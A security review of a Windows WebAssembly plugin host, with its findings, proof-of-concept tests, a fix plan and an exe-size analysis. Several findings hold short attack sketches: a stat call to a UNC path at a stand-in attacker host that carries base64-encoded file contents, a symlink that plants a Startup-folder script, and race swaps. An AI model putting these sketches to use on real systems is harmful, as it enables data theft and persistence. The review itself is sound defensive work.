# Security review of the Wasm plugin host (P5.P3)

Reviewed 2026-11-25 at commit `dab97ab` (main). Scope: `crates/tsubame-plughost`
(host, capabilities, manifest, protocol, supervisor client, adapters, install
step, tests, WIT), `tsubame-ext-api` where plugin data crosses into it,
`tools/release.ps1` for the size question, and `docs/wasm-plugins.md` /
`docs/spike-wasm.md` as the stated design. Host code was not changed. The
review added proof-of-concept tests only (see "Running the PoCs").

## Verdict

**Do not wire wasm plugins into the app until the "Before wiring" cards below are done.**
The wasm layer itself is sound: every import is gated, the protocol decoder on
the host side holds up, limits and kill-on-hang work as documented. The
weaknesses are around it:

1. **Path policy lets a plugin reach the network and leak the user's Windows
   credentials** with `network = false` (PH-01, confirmed).
2. **A read-write grant can be turned into a write outside the grant** through a
   dangling symlink (PH-04, confirmed), and the check/open race is real and easy
   to win (PH-05, confirmed, 10 % of reads on the first batch).
3. **Nothing binds what the user approved to what is loaded.** The hash record
   does not exist yet, capabilities are read from the live `plugin.toml`, and a
   write grant may cover Tsubame's own folders, which makes
   `Component::deserialize` reachable from a plugin (PH-02, PH-03).
4. **There is no containment below wasmtime.** The host runs with the user's
   full token, no job object, inherited handles and environment (PH-07).
5. **A slow plugin can freeze any thread that touches its `Plugin` object** for up
   to its own `timeout_ms` (PH-15, confirmed).

No finding is rated critical: none gives code execution or file access without
either a grant the user approved or a second local actor. Counts: 0 critical,
4 high, 6 medium, 11 low, 1 informational.

The size question is answered in "Exe size": **1.00 MiB is the correct figure and
reproduces**; 9 MiB is the same exe path overwritten by a build that links
Cranelift.

## Method and limits

- Read all of `crates/tsubame-plughost` and the WIT file, the relevant parts of
  `tsubame-ext-api`, wasmtime 50.0.2 source for hostcall fuel and `StoreLimits`,
  and the Rust 1.99.1 standard library for how child pipes and handle
  inheritance work on Windows.
- Ran the existing suite (49 unit, 19 end-to-end: all pass) and wrote 13 PoC
  tests; 13 of 13 demonstrate their weakness on Windows 11 with Developer Mode
  on (needed for the two symlink PoCs).
- Built the release host four ways to answer the size question, with linker maps
  for the breakdown.
- Anything not exercised by a test is listed under "Unverified".

## Trust boundaries

```
plugin package (.wasm + plugin.toml)      UNTRUSTED
        | tsubame-plugc (install step, Cranelift)
        v
<cache>/<id>-<version>.cwasm + SHA-256    TRUSTED ONLY IF the cache folder and the
        |                                 hash record are writable by the app alone
        v
app (client.rs)  --stdin/stdout-->  tsubame-plughost.exe  --wasmtime-->  guest
  TRUSTED            unnamed pipes      TRUSTED native code               UNTRUSTED
```

**`Component::deserialize` (host.rs:384).** The call is `unsafe` because wasmtime
runs the machine code in the image without validating it. What the host does
right: it reads the file once into memory, hashes that buffer and deserializes
the same buffer (host.rs:375-384), so there is no file swap between check and
use, and it uses `deserialize`, not `deserialize_file` (no mapping of a file
that can change underneath). The manifest refuses a `.cwasm` component name
(manifest.rs:282), so a package cannot ship one.

What that proves, and what it does not: the hash arrives in the `Load` request
from the client. The host therefore trusts **whoever can send `Load`** (the app,
over pipes nobody else can open) and, through the app, **whoever can write both
the `.cwasm` and the place the hash is kept**. PoC `ph03` modifies an image,
recomputes the hash and gets it loaded and run. The boundary is the file system
ACL of two locations that do not exist in code yet: the cache folder and the
install record. See PH-02 and PH-03 for how a plugin can end up inside that
boundary.

## Findings

Severity: critical / high / medium / low / info. Effort: S up to 3 h, M up to
1 day, L more. Locations are `file:line` in `crates/tsubame-plughost/` unless a
path is given.

| ID | Sev | Location | Description | Exploit sketch / PoC | Recommended fix | Effort |
|---|---|---|---|---|---|---|
| PH-01 | high | `src/caps.rs:220-256` (UNC accepted), `:387-389` (`*` covers it), `src/host.rs:218-223` (no further check), `src/manifest.rs:348` | UNC paths are valid paths. A `*` grant covers `\\server\share\...`, and the manifest accepts a UNC folder as a prefix grant, both with `network = false`. Opening such a path makes Windows connect to that server over SMB (sending the user's NTLM response) or WebDAV (`\\host@80\...`, an HTTP request whose path carries data). The prompt says "any file on this computer". Loopback forms (`\\127.0.0.1\C$`, `\\localhost\pipe\...`) reach admin shares and local named pipes. | Plugin with `{ path = "*", access = "read" }` calls `stat("\\\\attacker.example@80\\x\\<base64 of a file it read>")`: exfiltration and an NTLM leak with no network capability. **Confirmed:** `ph01_any_grant_makes_the_host_open_a_unc_path` reads `\\127.0.0.1\C$\Windows\win.ini` through the host and gets its contents; `ph01_unc_paths_pass_the_policy_without_the_network_capability` shows the policy and the manifest accept all forms. | In `PathPolicy::check`, a UNC path is allowed only (a) under an `$input` path that is itself UNC (the user is on that share), or (b) under a UNC prefix grant **and** `network = true`. `*` never covers UNC. Refuse `@` in the server name. `Manifest::parse` rejects a UNC grant without `network = true` and `summary()` names the server. | S |
| PH-02 | high | `src/manifest.rs:336-357` (any absolute path may be read-write), `src/host.rs:323-329` | Nothing stops a read-write grant from covering Tsubame's own folders: the `.cwasm` cache, the install record with the hashes, the plugin folders (`plugin.toml`, `.wasm`), the app's settings. `$plugin` is read-only, but `{ path = "<the same folder>", access = "read-write" }` is accepted. | Plugin granted read-write on a parent of the app data folder (or `*`) overwrites its own `.cwasm` and the recorded hash with a crafted image. Next start: `Component::deserialize` runs attacker machine code in the host, outside the wasm sandbox, with the user's token. Cheaper variant: it edits its own `plugin.toml` to add grants (PH-03). | The app passes a list of protected folders in `Load` (cache, install record, plugin root, app settings, exe folder). The host refuses every write whose resolved path is under one, whatever the grant, and refuses reads of the cache and record. `Manifest::capabilities` rejects a grant that overlaps them. Say in the prompt that read-write `*` is full control of the account. | M |
| PH-03 | high | `src/bin/tsubame-plugc.rs:24-26` (hash only printed), `src/client.rs:216-225` and `docs/wasm-plugins.md` "Using it from the app" (`Load` built from the live manifest) | The install record is not implemented, and the documented wiring builds `Load` from the current `plugin.toml` on every start. Approved capabilities are not pinned; the `.wasm` is not pinned (it is recompiled when the host version changes); there is no publisher identity. The hash covers the `.cwasm` only. | After approval, anything that can write the plugin folder (another program, an "update" of the package, the plugin itself via PH-02) adds `{ path = "*", access = "read-write" }` to `plugin.toml`; the next start grants it silently. `ph03_a_modified_cwasm_with_a_matching_hash_is_deserialized_and_run` shows the hash protects nothing once the record is writable. **Unverified in the app: the app does not load plugins yet.** | One install record per plugin, written only by the app: SHA-256 of `plugin.toml`, of the `.wasm`, of the `.cwasm`, the approved resolved capabilities, the wasmtime version. The loader uses the capabilities **from the record**, verifies all three hashes on every start, and re-prompts on any difference. `tsubame-plugc` writes a machine-readable result file instead of text on stdout. | M-L |
| PH-04 | high | `src/host.rs:225-233` (fallback to the parent for a missing file), `:325-327` (open follows links) | For a write to a path that "does not exist", the resolved-path check is done on the parent folder only. A dangling file symlink does not exist for `canonicalize`, so the check passes, and the open then follows the link and creates its target. | A folder the plugin has read-write on (an `$input` folder on a USB drive or from an extracted archive) contains `notes.txt -> C:\Users\<u>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\x.cmd`. `write-file("...\notes.txt", data)` creates the startup script. With a benign plugin that writes sidecar files this is a confused deputy: the attacker supplies only the media. **Confirmed:** `ph04_a_dangling_symlink_lets_write_file_create_a_file_outside_the_grant`. | Open first, check the handle (card B): open with `FILE_FLAG_OPEN_REPARSE_POINT`, refuse if the opened object is a reparse point, get the final path from the handle (`GetFinalPathNameByHandleW`), compare it with the resolved root, and do the I/O on that handle. For a new file: open the parent folder handle, verify it, create the leaf relative to it with `create_new`. | M (shared with PH-05, PH-06) |
| PH-05 | medium | `src/host.rs:211-243` then `:292`, `:298`, `:312`, `:327` | The check works on a path string, the use opens the string again. Documented as a known limit; it is easy to win. | A process swaps `granted\f.txt` from a plain file to a symlink to a file outside with one atomic rename, in a loop. **Confirmed:** `ph05_swapping_a_file_for_a_link_between_check_and_open_reads_outside_the_grant` got the outside file on 50 of the first 500 reads. With junctions only (no symlink right) a two-rename swap did not win in 30 s (282,500 reads); an oplock on the root folder would make it deterministic (not tried). Needs a second local actor, which is why this is medium. | Same handle-based open as PH-04. | with PH-04 |
| PH-06 | low | `src/host.rs:211-243` | A hard link inside a grant is the outside file. Documented as a known limit. | **Confirmed:** `ph06_a_hard_link_reads_and_overwrites_a_file_outside_the_grant` reads and replaces a file outside a read-write grant. The planter needs rights on the target and the same volume. | After opening, `GetFileInformationByHandle`: refuse a write when `nNumberOfLinks > 1` unless the path is exactly an input path. Decide whether reads are refused too. | with PH-04 |
| PH-07 | medium (**tier 1 done**, tiers 2-3 open) | `src/client.rs:90-105` (`Command::spawn`), `src/main.rs:13-30` | The host process has no containment of its own: same token and integrity level as the app (elevated if the app is elevated), no job object (no kill-on-close, no process or memory limit), no mitigation policies, the whole environment block, the app's current folder, and every inheritable handle of the app (the standard library spawns with `bInheritHandles = TRUE` and no handle list). A wasmtime bug or PH-02/PH-03 is then a full compromise of the account. | Any future memory-safety bug below the wasm layer. Also today: an environment variable with a token is readable by host code; a host blocked in a slow share read outlives a crashed app. | Tier 1 (do now, in the app's own `Launcher`, which already may use the `windows` crate): job object with `KILL_ON_JOB_CLOSE`, `ActiveProcessLimit = 1`, process memory limit of `max_memory_mb` plus a fixed overhead, UI restrictions; assign before `Load` is sent. `env_clear()` plus `SystemRoot`; fixed `current_dir`; absolute exe path next to the app; explicit handle list; child-process and extension-point mitigation policies; refuse to start plugins from an elevated app (or start the host with the unelevated token). Tier 2: restricted token (`DISABLE_MAX_PRIVILEGE`), low integrity for plugins with no write grant outside `$data`. Tier 3 (design work): AppContainer per plugin, which also denies the network at the OS level. **Status: tier 1 fixed** (card D): `JobLauncher` in `crates/tsubame-plughost/src/launcher.rs`, tests in `tests/launcher.rs`. Still open: explicit handle list, mitigation policies, tiers 2-3 (card L). | M (tier 1), L (tier 2-3) |
| PH-08 | medium | `src/host.rs:69`, `:85-89` | `max_memory_mb` counts linear memories only. Tables are limited to 2^20 elements each and 256 tables per store, none of it counted: 256 x 2^20 x 8 bytes = 2 GiB of host memory for a plugin shown to the user as "up to 1 MB". Nothing caps the process either (PH-07). | A component whose core modules declare 256 funcref tables of 1,048,576 elements. Each instantiation commits about 2 GiB; a fresh instance is built after every fault. **Computed from the limits and wasmtime's documentation of `StoreLimits`, not measured.** | Count table bytes (`elements * 8`) in the same budget as memory in `Limiter::table_growing`; lower the caps to what a real component needs (for example 16 tables, 65,536 elements, 32 instances, 8 memories). Job memory limit as the backstop. | S |
| PH-09 | low | `src/caps.rs:180-189` | `is_device_name` knows `COM1`-`COM9` and `LPT1`-`LPT9` with ASCII digits. Windows also reserves the superscript digits (`COM¹`, `COM²`, `COM³`, `LPT¹`...). | **Confirmed:** `ph09_superscript_device_names_are_accepted`. Reaching a device needs the name to be an exact input path or a `*` grant (elsewhere the resolved check fails), so impact is a serial or parallel port open. | Add `¹ ² ³` to the digit test. | S |
| PH-10 | low | `src/host.rs:702-704`, `src/manifest.rs:234-279` | The cache file name `<id>-<version>.cwasm` is ambiguous: `-` and `.` are legal in both parts. | **Confirmed:** `ph10_two_plugins_map_to_the_same_cwasm_name`: id `a.b-1.0.0` version `2.0.0` and id `a.b` version `1.0.0-2.0.0` both give `a.b-1.0.0-2.0.0.cwasm`. One plugin's install replaces the other's image; the hash check then makes the victim fail to load (denial of service), or load the wrong image if the app keys its record by file name. | A separator neither part can contain (`<id>@<version>.cwasm`) or one folder per id. Key the install record by id. | S |
| PH-11 | low | `src/manifest.rs:253-264` (`check_label`), `:234-242` (`check_plugin_id`) | Labels refuse control characters only. Bidirectional overrides (U+202E), zero-width characters and look-alikes pass, in the plugin name, titles and command key labels shown in the install prompt. Plugin ids may start with a DOS device name (`nul.x`, `aux.plugin`, `com1.tools`); the id becomes a file name and probably a folder name, which is the device on Windows 10 and older. | **Confirmed:** `ph11_manifest_accepts_spoofing_characters_and_device_name_ids`. A plugin named `Tsubame <U+202E>...` renders as something else in the prompt. `nul.x-1.0.0.cwasm` writes the image to `NUL` on older Windows. | Refuse Unicode categories Cf, Zl, Zp and private use in every label; refuse an id whose first segment is a device name. Show the id next to the name in the prompt. | S |
| PH-12 | medium | `src/host.rs:494`, `:513`, `:568`, `:581-585` (what counts as input), `src/caps.rs:395-405` (inputs cover everything under them) | `$input` is broader than "the files and folders you use it on" suggests. Every input that is a folder grants its whole tree. For a column, the inputs are all rows of the listing, so browsing a folder hands the plugin the full tree under every subfolder shown. For a command, the current folder is always added, so a read-write `$input` command on one selected file has read-write on the whole folder tree. | A column plugin with `{ path = "$input", access = "read" }`, enabled while the user opens their profile folder, reads `.ssh`, browser profiles and documents by walking down from the listed folders. With `$data` read-write it can stage copies; with PH-01 it can send them. By design today, so no PoC beyond the existing unit test `input_grants_follow_the_call` (caps.rs:549-550). | Scope inputs by kind. Column and previewer: the path itself; for a folder, `stat` and a non-recursive `read-dir` at most. Command: the selection (recursive for selected folders); the current folder non-recursive, or only when nothing is selected. Search: the root (recursive, that is the feature). Make `summary()` say which. Needs an owner decision. | M |
| PH-13 (a open, **b fixed** by Card F) | low | `src/proto.rs:509-524` (`dec_cells`), `:551-575` (`dec_doc`), `src/host.rs:515-540`, `src/adapters.rs:64-94` | (a) The client checks a list count against the bytes left with a minimum item size of 1, then reserves `count * size_of::<T>()`. A 16 MiB reply makes the app allocate 880 MiB for nodes (56 bytes each) or 384 MiB for cells, before the count is compared with the request. Needs a compromised host. (b) For an honest host and a hostile guest, the output has no content caps: any number of preview nodes (hostcall fuel bounds it near 600,000), cell text and command messages up to the 16 MiB frame, and `limits.max-bytes` is passed to the guest but not enforced on the answer. Oversized cell text skips the cache but is still returned to the view. | **Confirmed (a):** `ph13_a_small_reply_makes_the_client_allocate_many_times_its_size` (55x). (b) by reading. Effect: memory pressure and a view asked to lay out megabytes of text. | `dec_cells` takes the expected count and refuses another before reserving. Cap nodes per document (for example 4,096), text per node and per cell (1 KiB for a cell), the command message (1 KiB), and total preview bytes at `limits.max_bytes`, in the host and again in the client. | S |
| PH-14 | low | `src/client.rs:263-278`, `:291-292` | The reader thread reads frames whenever they arrive and puts them in an unbounded channel, also when no request is pending. | **Confirmed:** `ph14_unsolicited_frames_are_read_and_queued_without_limit`: an idle client takes 48 MiB of frames it never asked for and still reports the host as running; only the next call notices. Needs a compromised host. | `sync_channel(1)`, and treat a frame that arrives with no request pending as a protocol error that kills the host. | S |
| PH-15 | medium | `src/client.rs:483-505` (state lock held across the round trip), `:346-387` | `call` holds the `Plugin` state mutex until the reply arrives. `status()`, `stats()`, `reset()`, `shutdown()`, `stop_if_idle()` and `Drop` wait behind it for up to `timeout_ms + grace`, a value the plugin chooses (up to 30.25 s). The docs tell the app to call `stop_if_idle` "from events it already has". | A plugin that answers just under its timeout. Any UI-thread touch of the object (a status badge, the idle check, closing a tab that drops the provider) freezes the window. **Confirmed:** `ph15_status_blocks_behind_a_call_in_flight` (1.55 s for a 1,500 ms timeout). | Do not hold the state lock across I/O: a separate call mutex for the connection, state behind a short lock or atomics; `stop_if_idle` uses `try_lock` and reports "busy". | S-M |
| PH-16 (**fixed**, Card F) | medium | `src/adapters.rs:118-120`, `:142-144`, `:169-171`, `src/host.rs:535`, `:551`, `:576` | Plugin output reaches the app's types unvalidated. `Hit.path` is any string: a plugin with **no** capabilities can return `\\attacker.example\share\x`, and the app touching that hit (icon, size, open) is the SMB leak of PH-01. `VfsEntry.name` may contain separators, `..`, `:` or device names: a traversal when the app joins names or copies out of a plugin VFS. `Button.command` may name any registered command under any label. | A search provider that returns one UNC hit. A vfs provider with an entry named `..\..\Startup\x.cmd`. A previewer with a button labelled "Open" bound to a delete command. **Unverified in the app: nothing consumes these yet** (no use of `Node::Button` in `src/`). | Validate at the adapter, which is the boundary: hits must normalize (`caps::normalize`), lie under the query root when one is given, and be UNC only when the root is; entry names must pass `check_component`; a button may only run `<plugin id>.<command>`; all strings go through the sanitizer of PH-17. | M |
| PH-17 (**fixed**, Card F) | low | `src/manifest.rs:365`, `src/bin/tsubame-plugc.rs:30`, `src/host.rs:286`, `src/proto.rs:462-474`, `src/client.rs:146` | Untrusted text in messages. A TOML syntax error repeats the offending source line: 60 KB and raw escape characters go to `eprintln!` in `tsubame-plugc` and into whatever dialog shows the error. The host's log filter replaces `char::is_control` only, so U+2028/U+2029 (line breaks in many viewers) and bidi controls pass; stderr is inherited when `inherit_stderr` is set. A plugin's `err` text is shown as is, with no attribution (`CallError::Plugin` prints the bare text). The 1 KiB cut is done by the host; the client does not repeat it. | **Confirmed:** `ph17_a_manifest_error_repeats_untrusted_input_unbounded_and_unescaped` (60,128 byte message containing ESC). A plugin error that reads like a message from Tsubame. | One `sanitize(text, max_len)` (drop Cc, Cf, Zl, Zp; cut) used for manifest errors (also drop the source excerpt), log lines, every string the client decodes from an `Err` reply, and adapter error strings, which should start with the plugin's name. | S |
| PH-18 | low | `src/host.rs:692-708`, `src/manifest.rs:476-484` | Install step on untrusted input: no time or memory bound on the Cranelift compile of a `.wasm` of up to 64 MiB; a fixed temp name written with `fs::write`, which follows a link planted in the cache folder; sizes are checked with `metadata` and then the file is read without a limit (also for `plugin.toml`). | A package that compiles for minutes or exhausts memory (not tried). If the cache folder is writable by anyone else, a planted `<id>-<ver>.cwasm.tmp` link redirects the write. | The app runs `tsubame-plugc` in a job with a time and memory limit. Random temp name with `create_new`. Read through `take(limit + 1)`. | S |
| PH-19 | low | `src/host.rs:323-329`, `src/adapters.rs:17`, `:146-154`, `src/client.rs:32`, `:570-612` | Resource use that no capability bounds: `write-file` has no quota (a plugin with `$data` fills the disk, 32 MiB per call); a vfs read buffers up to 256 MiB in the app; a listing or search may take 5,000 pages, each with its own deadline (5,000 x 30 s is 41 hours of one worker); answers just under the deadline never count as faults. | A vfs provider that returns one entry per page, each after `timeout_ms - 1`. | A total deadline per operation in the client (for example 10 x `timeout_ms`, or passed by the caller); a write quota per plugin and session; lower `VFS_READ_MAX` or stream to a temp file. | M |
| PH-20 | low | `tools/release.ps1:104-113`, `tests/host.rs` (`release_exe_is_small`), `Cargo.toml` features | The shipped host can silently be the 9 MB Cranelift build: `target/release/tsubame-plughost.exe` is overwritten by any build with other features (`cargo test --release`, `--features compiler`), `release.ps1 -SkipBuild` / `-ExeDir` packages whatever is there, and the size test passes when the file is missing. A JIT compiler in the host is not reachable from the protocol today, but it is 8 MB of code that should not be in a process that runs untrusted guests. | See "Exe size". | `release.ps1` fails when the host exceeds the budget. Move `tsubame-plugc` into its own crate so the `compiler` feature cannot unify into the host. | S |
| PH-21 | low | `src/host.rs:249-269` | `get-capabilities` returns the resolved `$plugin` and `$data` folders, which contain the Windows user name, to every plugin, including ones with no grants. | A capability-free plugin learns the account name and the install layout. | Return `$plugin` / `$data` as symbolic scopes; resolve them only inside the host. | S |
| PH-22 | info | `docs/wasm-plugins.md` "Bounds", `src/proto.rs:342-352`, `src/host.rs:232-242` | Documentation and code differ. The host refuses more than 2,000 paths but not "about 1 MiB of path text" (only the client splits). `fs-error` distinguishes `denied` from `not-found` after resolution, so a junction inside a grant is an existence oracle for the folder it points to. `network = true` and `run_processes = true` are shown to the user ("Use the network") while granting nothing. | None. | Enforce `MAX_BATCH_BYTES` in `dec_paths`; return `denied` for anything that resolves outside; say "reserved" in the prompt until an import exists. | S |

## What was checked and holds

| Topic | Result |
|---|---|
| Every WIT import gated | `get-capabilities` and `log` need nothing by design (`log` is limited to 64 lines of 1 KiB per call). `stat`, `read-file`, `read-dir`, `write-file` all go through `Ctx::resolve` (host.rs:291, 297, 309, 324). No WASI is linked; unknown imports are traps (host.rs:390). No import reaches the network or starts a process, so those two flags cannot be bypassed inside wasm. |
| Lexical path rules | Relative and drive-relative paths, `.` and `..`, any `:` after the drive (alternate data streams, `::$DATA`), `< > " \| ? *`, control characters, trailing dot or space, `\\.\`, `\\?\Volume{}`, `\\?\GLOBALROOT`, and the ASCII device names are refused before any grant is looked at. Case folding is ASCII only and fails closed. Prefix match needs a component boundary. |
| Junctions and existing symlinks | The resolved-path check refuses them when stable (existing test, and 241 correct refusals in the PH-05 run). |
| 8.3 short names | A short alias of a name inside a grant resolves to the long name and stays inside. A short alias of the grant root does not match lexically and is denied. No escape found. By reading; not tested. |
| `.cwasm` integrity mechanics | Load from bytes, hash and deserialize the same buffer, 256 MiB cap, `.cwasm` refused in packages, engine settings and wasmtime version checked by wasmtime's own header. The weakness is where the hash comes from (PH-03), not how it is checked. |
| Memory limit | Sum of linear memories capped; a refused growth is reported as `Memory` (existing test). Gap: tables (PH-08). |
| Time limit | Epoch interruption on every entry including instantiation; watchdog race handled under one lock; instance dropped after a trap (existing test). |
| Host calls that allocate | wasmtime's hostcall fuel is charged in host bytes (`len * size_of::<T>()` for lists, bytes for strings) and reset per lift, so one call or one result copies at most 32 MiB. `read-file` is capped at 4 MiB, `read-dir` at 2,000 entries. |
| Large `list<string>` batches | 2,000 paths per call enforced by the host decoder; lowering into the guest goes through the guest's allocator and so through the memory limit. |
| Kill on hang | Client deadline, `TerminateProcess`, reap; three faults switch the plugin off (existing tests). |
| Child processes | The host starts none and has no import that could. Nothing enforces it at the OS level (PH-07). |
| Orphans | The host exits when its stdin closes. A spinning guest is interrupted within `timeout_ms` first. A host blocked inside a file read stays until the read returns; only a job object fixes that. By reading; not tested. |
| Protocol, host side | Length prefix checked before allocation (5 bytes to 16 MiB), every read bounds-checked, counts checked against bytes left, trailing bytes refused, unknown kinds refused, second `Load` refused, calls before `Load` refused. The request side is sent by the trusted app. |
| Who can connect to the pipe | Nobody. The transport is the child's stdin and stdout. The standard library creates them with `NtCreateNamedPipeFile` without a name and opens the other end itself, so there is no pipe name to connect to and no ACL question. |
| Manifest parsing | Unknown keys refused everywhere, ranges not clamped, 64 KiB cap. The TOML parser has a recursion limit: 30,000-deep arrays, inline tables, dotted keys and table headers are refused in about 2 ms with no stack overflow (tried). |
| SHA-256 | Own implementation, checked against the standard vectors and the padding edges (existing test). Not constant time, which does not matter here. |

## Exe size

### How the two figures arise

Measured on this commit, release profile of the workspace (opt 3, fat LTO, one
codegen unit, strip, panic abort), rustc 1.99.1, wasmtime 50.0.2:

| Build command | `target/release/tsubame-plughost.exe` |
|---|---|
| `cargo build --release -p tsubame-plughost` | **1,051,136 B = 1.00 MiB** |
| `cargo build --release -p tsubame -p tsubame-handler -p tsubame-plughost` (what `release.ps1 -WithPlughost` runs) | **1,051,136 B = 1.00 MiB** |
| `cargo test --release -p tsubame-plughost` (the test build leaves this exe behind) | 8,974,336 B = 8.56 MiB |
| `cargo build --release -p tsubame-plughost --features compiler` | 8,977,408 B = 8.56 MiB |
| `tsubame-plugc.exe` (for comparison) | 9,491,968 B = 9.05 MiB |

So the documented 1.00 MB figure is right and is exactly what a plain release
build produces. `docs/wasm-plugins.md` used "MB" for MiB (1,051,136 B is
1.05 MB decimal).

The large figure comes from **the same file being overwritten by a build that
enables `wasmtime/cranelift`**:

- The crate's `[dev-dependencies]` list wasmtime again with `cranelift`. Any
  command that builds test targets (`cargo test --release`, `--all-targets`)
  unifies that feature into the library and into the host exe, and cargo writes
  that exe to the same `target/release/tsubame-plughost.exe`.
- `--features compiler` does the same on purpose.
- `cargo tree -e normal` correctly shows no Cranelift code generator for a plain
  build, which is why "no Cranelift in the normal graph" and "9 MiB" could both
  be observed: the graph was checked for one build, the size read from the
  leftovers of another.
- The existing test `release_exe_is_small` measures that same path, so it fails
  after a `--features compiler` build and passes (or reports "not built") after
  a clean one. This was reproduced during the review.

**Unverified:** the exact command behind the reported 9.31 MiB. The contaminated
builds here are 8.56 MiB. `docs/spike-wasm.md` gives 9,764,864 B for the spike's
full host, which is 9.31 MiB, so the entry may come from a wider feature
unification (`cargo test --release --workspace`) or from an older build. The
mechanism is the same either way.

### Breakdown

From the linker map of each build, symbols attributed to the first crate named
in the mangled name (generic code instantiated for the host is counted under
the crate that defines it; treat the split as approximate).

Runtime-only host, 1,051,136 B:

| Part | Bytes |
|---|---|
| Code (`.text`) | 875,582 |
| Read-only data, unwind and import tables | 150,266 |
| `.pdata`, `.data`, headers, relocations | 25,288 |

| Crate | Bytes (all sections) |
|---|---|
| `wasmtime` (runtime, component model, instance and store code) | 300,393 |
| `wasmtime_environ` (types and metadata, 93 KB of it serde decoders for the `.cwasm` header) | 147,104 |
| `tsubame_plughost` (serve loop, imports, bindings, protocol, SHA-256) | 109,276 |
| constant data of the LTO unit not attributable to a crate | 108,947 |
| `core` | 103,069 |
| `postcard` (decoding the `.cwasm` metadata) | 57,908 |
| `std` | 43,458 |
| `alloc` | 26,338 |
| `wasmtime_internal_core` | 22,388 |
| `target_lexicon` | 19,144 |
| `rustc_demangle` | 17,222 |
| `hashbrown`, `cranelift_bforest` (a B-tree used by the runtime), `serde_core`, `once_cell`, the C runtime, others | about 72,000 |

Host with Cranelift linked, 8,977,408 B: `cranelift_codegen` 2.39 MB,
`cranelift_assembler_x64` 1.91 MB, `wasmtime_internal_cranelift` 0.85 MB,
`wasmparser` 0.64 MB, `regalloc2` 0.40 MB, `pulley_interpreter` 0.19 MB,
`gimli` 0.13 MB; the runtime parts are the same as above. The compiler and its
support are 7.9 MB of the 8.98 MB.

### Proposed budget

| Exe | Budget | Today | Reason |
|---|---|---|---|
| `tsubame-plughost.exe` | **1.5 MiB (1,572,864 B), hard failure in `release.ps1`** | 1.00 MiB | 50 % headroom for the fixes here (handle-based file access, limits) and for future imports. Keep `release_exe_is_small` at 1,250,000 B as the early warning. |
| `tsubame-plugc.exe` | 11 MiB | 9.05 MiB | The compiler. Not part of the base install; fetched or installed with the plugin feature. |

Do **not** adopt the "< 12 MB" suggested in `docs/PLAN.md` for the host: that
number only fits a host with Cranelift in it and would make the check useless.
The budget is a security control as much as a size control: a host over 2 MiB
almost certainly contains a compiler.

If `wasmtime-wasi` is ever added for guest shims, measure first; it does not
fit this budget (not measured).

## Fix plan

Order: cards A to F before the app loads any third-party plugin; G to L before
plugins are advertised as sandboxed; the rest any time. Each card names the PoC
tests that must flip: turn the assertion round, remove `#[ignore]`, keep the
test as the regression test.

### Before wiring

**Card A. UNC and device names in the path policy** (PH-01, PH-09). S. Any
mid-tier model.
- `src/caps.rs`: `PathPolicy::check` returns `NotGranted` for a UNC path unless
  an `$input` root that is itself UNC covers it, or a UNC prefix grant covers it
  and the capabilities have `network = true` (`PathPolicy::new` needs the flag).
  `Root::Any` never applies to UNC. `check_component` on the server name also
  refuses `@`. `is_device_name` accepts `¹ ² ³` as digits.
- `src/manifest.rs`: a UNC grant without `network = true` is a manifest error.
- `Capabilities::summary`: "Read files on the server `\\server\share`".
- Done when: both `ph01_*` tests and `ph09_*` fail as written and pass inverted;
  `docs/wasm-plugins.md` path table updated.

**Card B. Handle-based file access** (PH-04, PH-05, PH-06). M. Strong model,
second review required: this is the file sandbox.
- Add `windows-sys` (already in the graph through wasmtime) as a direct
  dependency under the `host` feature.
- New `src/host/fsopen.rs`: `open_checked(norm, roots, want) -> File`. Open with
  `FILE_FLAG_OPEN_REPARSE_POINT | FILE_FLAG_BACKUP_SEMANTICS`; refuse a reparse
  point unless the path is exactly an input path; `GetFinalPathNameByHandleW` on
  the handle; compare with the resolved root; return the handle. For a new file:
  open and verify the parent, then create the leaf with `create_new` and verify
  the new handle the same way. For writes refuse `nNumberOfLinks > 1`.
- `stat`, `read-file`, `read-dir`, `write-file` use the returned handle only;
  no second open by path.
- Done when: `ph04_*`, `ph05_*`, `ph06_*` flip; the existing junction test still
  passes; the "Known limits" list in the docs loses its first two entries.

**Card C. Install record and protected folders** (PH-02, PH-03, PH-10, PH-18).
M-L. Needs an owner decision on the record format first; then a strong model.
- `tsubame-plugc` writes `<cache>/<id>/<version>/component.cwasm` and a result
  file (id, version, three SHA-256 values, wasmtime version) with a random temp
  name and `create_new`.
- New module `install_record`: load, verify the three hashes, return the
  approved `Capabilities`. `Load::new` takes the record, not the manifest's
  live capabilities.
- `Load` gains `protected: Vec<String>`; the host refuses writes (and reads of
  cache and record) under them after resolution; `Manifest::capabilities`
  refuses overlapping grants. Protocol version 2.
- Done when: `ph03_*` and `ph10_*` flip; a test edits `plugin.toml` after
  install and the load is refused.

**Card D. Host process containment, tier 1** (PH-07). M. Mid-tier model; no GUI. **Done**: `crates/tsubame-plughost/src/launcher.rs` (`JobLauncher`; lives in the client crate because the app does not load plugins yet).
- In the app (it already has the `windows` crate), a `Launcher` that: creates a
  job (`KILL_ON_JOB_CLOSE`, `ActiveProcessLimit = 1`, process memory limit, UI
  restrictions), spawns with a cleared environment, a fixed working folder and
  an absolute exe path, assigns the process to the job before the client sends
  `Load`, and refuses to start when the app is elevated.
- Done when: a test kills the launcher's owner and the host is gone; a test
  host that tries to start a child fails; `ProcessLauncher` is documented as
  test-only.

**Card E. `$input` scope per entry-point kind** (PH-12). M. Owner decision
first (see the fix column), then a mid-tier model: `PathPolicy::set_inputs`
takes `(path, recursive)` pairs; `host.rs` builds them per request kind;
`summary()` text follows.

**Card F. Validate plugin output at the adapters** (PH-16, PH-17, PH-13 b). M. **Done:** `src/sanitize.rs`; caps are node count 4,096, 8 KiB per text node, 256 B per label/command, 1 KiB per cell and per message, `limits.max_bytes` for the document.
Mid-tier model.
- `src/sanitize.rs`: `sanitize(&str, max) -> String`.
- `adapters.rs`: hit paths, entry names, button commands, string caps as in the
  fix columns. Host applies the same caps before encoding so an honest host
  never sends what the client would refuse.
- Done when: `ph17_*` flips; new tests for a UNC hit, a `..` entry name and a
  foreign button command.

### Before calling plugins sandboxed

**Card G. Limits** (PH-08). S. Cheap model. Table bytes in the memory budget,
lower store caps; test with a component that declares many large tables.

**Card H. Client robustness** (PH-13 a, PH-14, PH-15). S-M. Mid-tier model.
Expected count in `dec_cells`; `sync_channel(1)` and "unsolicited frame is a
protocol error"; state lock not held across the round trip. Done when
`ph13_*`, `ph14_*`, `ph15_*` flip.

**Card I. Operation deadlines and quotas** (PH-19). M. Mid-tier model.

